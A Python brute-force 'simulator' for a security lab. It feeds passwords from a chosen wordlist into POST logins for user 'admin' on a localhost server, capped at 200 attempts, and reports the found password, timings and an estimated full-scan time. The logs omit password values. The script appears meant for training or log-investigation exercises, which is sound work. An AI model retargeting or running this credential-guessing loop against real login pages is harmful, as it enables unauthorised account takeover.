import requests
import time
import tkinter as tk
from tkinter import filedialog
from pathlib import Path
from datetime import datetime


# ============================================================
# SECURITY LAB AUTHENTICATION
# BRUTE FORCE SIMULATOR
# ============================================================

TARGET_URL = "http://127.0.0.1:5000/"
USERNAME = "admin"

MAX_ATTEMPTS = 200

LOG_DIR = Path("logs")
LOG_DIR.mkdir(exist_ok=True)


# ------------------------------------------------------------
# Wordlist selection
# ------------------------------------------------------------

def select_wordlist():

    root = tk.Tk()
    root.withdraw()

    file_path = filedialog.askopenfilename(
        title="Select Generated Wordlist",
        filetypes=[
            ("Text Files", "*.txt"),
            ("All Files", "*.*")
        ]
    )

    root.destroy()

    return file_path


# ------------------------------------------------------------
# Create a separate log for every scan
# ------------------------------------------------------------

def create_scan_log():

    timestamp = datetime.now().strftime(
        "%Y%m%d_%H%M%S_%f"
    )

    return LOG_DIR / (
        f"authentication_scan_{timestamp}.log"
    )


# ------------------------------------------------------------
# Write investigation log
# Password values are NOT stored.
# ------------------------------------------------------------

def write_log(
    log_file,
    request_number,
    status_code,
    response_time
):

    now = datetime.now()

    date_value = now.strftime("%Y-%m-%d")
    time_value = now.strftime("%H:%M:%S.%f")[:-3]

    log_entry = (
        f"{date_value} {time_value} | "
        f"IP=127.0.0.1 | "
        f"METHOD=POST | "
        f"ENDPOINT=/ | "
        f"USERNAME={USERNAME} | "
        f"REQUEST={request_number:03d} | "
        f"STATUS={status_code} | "
        f"RESPONSE_TIME={response_time:.3f}s\n"
    )

    with open(
        log_file,
        "a",
        encoding="utf-8"
    ) as log:

        log.write(log_entry)


# ------------------------------------------------------------
# Format seconds
# ------------------------------------------------------------

def format_time(seconds):

    if seconds < 60:
        return f"{seconds:.2f} seconds"

    minutes = int(seconds // 60)
    remaining_seconds = int(seconds % 60)

    if minutes < 60:
        return f"{minutes} min {remaining_seconds} sec"

    hours = int(minutes // 60)
    remaining_minutes = minutes % 60

    return (
        f"{hours} hr "
        f"{remaining_minutes} min "
        f"{remaining_seconds} sec"
    )


# ------------------------------------------------------------
# Main simulator
# ------------------------------------------------------------

def main():

    print()
    print("=" * 60)
    print("              BRUTE FORCE SIMULATOR")
    print("=" * 60)
    print()

    started_datetime = datetime.now()

    print(
        f"Target             : {TARGET_URL}"
    )

    print(
        f"Username           : {USERNAME}"
    )

    print(
        f"Started            : "
        f"{started_datetime.strftime('%Y-%m-%d %H:%M:%S')}"
    )

    print()

    # --------------------------------------------------------
    # Select wordlist
    # --------------------------------------------------------

    wordlist_path = select_wordlist()

    if not wordlist_path:

        print("No wordlist selected.")
        return

    wordlist_name = Path(wordlist_path).name

    print(
        f"Wordlist           : {wordlist_name}"
    )

    # --------------------------------------------------------
    # Read complete wordlist
    # --------------------------------------------------------

    try:

        with open(
            wordlist_path,
            "r",
            encoding="utf-8",
            errors="ignore"
        ) as file:

            all_passwords = [
                line.strip()
                for line in file
                if line.strip()
            ]

    except Exception as error:

        print()
        print(
            f"Unable to read wordlist: {error}"
        )

        return

    total_wordlist = len(all_passwords)

    # Only 200 passwords will actually be tested
    passwords_to_test = all_passwords[
        :MAX_ATTEMPTS
    ]

    actual_test_count = len(passwords_to_test)

    print(
        f"Total Wordlist     : "
        f"{total_wordlist} passwords"
    )

    print(
        f"Test Limit         : "
        f"{actual_test_count} passwords"
    )

    print()

    # --------------------------------------------------------
    # Create new investigation log
    # --------------------------------------------------------

    log_file = create_scan_log()

    with open(
        log_file,
        "w",
        encoding="utf-8"
    ) as log:

        log.write(
            "SECURITY LAB AUTHENTICATION\n"
        )

        log.write(
            "AUTHENTICATION ACTIVITY LOG\n"
        )

        log.write(
            "=" * 75 + "\n"
        )

        log.write(
            f"TARGET={TARGET_URL} | "
            f"USERNAME={USERNAME}\n"
        )

        log.write(
            f"WORDLIST={wordlist_name} | "
            f"TOTAL_CANDIDATES={total_wordlist} | "
            f"TEST_LIMIT={actual_test_count}\n"
        )

        log.write(
            "=" * 75 + "\n"
        )

    # --------------------------------------------------------
    # Table header
    # --------------------------------------------------------

    print(
        "-" * 68
    )

    print(
        f"{'Request':<10}"
        f"{'Payload':<28}"
        f"{'Status':<12}"
        f"{'Response':<15}"
    )

    print(
        "-" * 68
    )

    # --------------------------------------------------------
    # Start actual 200-request timer
    # --------------------------------------------------------

    scan_start = time.perf_counter()

    successful_matches = []

    found_time = None

    # --------------------------------------------------------
    # Send requests
    # --------------------------------------------------------

    for request_number, password in enumerate(
        passwords_to_test,
        start=1
    ):

        request_start = time.perf_counter()

        data = {
            "username": USERNAME,
            "password": password
        }

        try:

            response = requests.post(
                TARGET_URL,
                data=data,
                timeout=5
            )

            status_code = response.status_code

        except requests.RequestException:

            status_code = 0

        request_time = (
            time.perf_counter()
            - request_start
        )

        # ----------------------------------------------------
        # Server investigation log
        # ----------------------------------------------------

        write_log(
            log_file=log_file,
            request_number=request_number,
            status_code=status_code,
            response_time=request_time
        )

        # ----------------------------------------------------
        # Detect successful authentication
        # ----------------------------------------------------

        if status_code == 200:

            if found_time is None:

                found_time = (
                    time.perf_counter()
                    - scan_start
                )

            successful_matches.append(
                (
                    request_number,
                    password,
                    request_time
                )
            )

            # Blue successful row
            print(
                "\033[44m\033[97m"
                f"{request_number:<10}"
                f"{password:<28}"
                f"{status_code:<12}"
                f"{request_time:.3f}s"
                "\033[0m"
            )

        else:

            print(
                f"{request_number:<10}"
                f"{password:<28}"
                f"{status_code:<12}"
                f"{request_time:.3f}s"
            )

    # --------------------------------------------------------
    # End actual 200-request timer
    # --------------------------------------------------------

    total_scan_time = (
        time.perf_counter()
        - scan_start
    )

    # --------------------------------------------------------
    # Calculate average request time
    # --------------------------------------------------------

    if actual_test_count > 0:

        average_request_time = (
            total_scan_time
            / actual_test_count
        )

    else:

        average_request_time = 0

    # --------------------------------------------------------
    # Estimate complete wordlist scan
    # --------------------------------------------------------

    estimated_full_scan = (
        average_request_time
        * total_wordlist
    )

    # --------------------------------------------------------
    # Final output
    # --------------------------------------------------------

    print()
    print("-" * 68)
    print()

    if successful_matches:

        first_match = successful_matches[0]

        print(
            "\033[44m\033[97m"
            "                 PASSWORD FOUND"
            "\033[0m"
        )

        print()

        print(
            f"Password Found    : "
            f"{first_match[1]}"
        )

        print(
            f"Status Code       : 200"
        )

        print(
            f"Request           : "
            f"{first_match[0]:03d}"
        )

        print(
            f"Password Found In : "
            f"{format_time(found_time)}"
        )

    else:

        print(
            "NO VALID PASSWORD FOUND"
        )

    print()
    print("-" * 68)
    print()

    print("SCAN SUMMARY")
    print()

    print(
        f"Total Wordlist       : "
        f"{total_wordlist} passwords"
    )

    print(
        f"Passwords Tested     : "
        f"{actual_test_count}"
    )

    print(
        f"200 Password Scan    : "
        f"{format_time(total_scan_time)}"
    )

    if found_time is not None:

        print(
            f"Password Found In    : "
            f"{format_time(found_time)}"
        )

    else:

        print(
            "Password Found In    : "
            "Not found"
        )

    print(
        f"Estimated Full Scan  : "
        f"{format_time(estimated_full_scan)}"
    )

    print()

    print(
        "[✓] Authentication logs generated successfully."
    )

    print(
        "[✓] Investigation log saved successfully."
    )

    print(
        f"[✓] Log File: {log_file}"
    )

    print()
    print("=" * 60)
    print("                 SCAN COMPLETED")
    print("=" * 60)
    print()


# ------------------------------------------------------------
# Start
# ------------------------------------------------------------

if __name__ == "__main__":
    main()